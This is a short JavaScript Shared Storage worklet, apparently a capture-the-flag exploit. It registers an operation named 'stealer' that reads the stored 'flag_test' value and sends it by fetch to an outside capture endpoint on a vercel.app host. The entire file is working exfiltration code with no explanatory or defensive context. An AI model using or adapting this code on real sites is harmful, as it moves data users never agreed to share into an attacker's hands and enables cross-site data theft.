class StealerOperation {
  async run(urlParams, data, reporter) {
    const value = await sharedStorage.get("flag_test");

    // Send the value as a GET request to your endpoint
    const url = `https://ssrf-eta.vercel.app/api/capture?flag=${encodeURIComponent(value)}`;
    await fetch(url, { method: "GET" });
  }
}
register("stealer", StealerOperation);
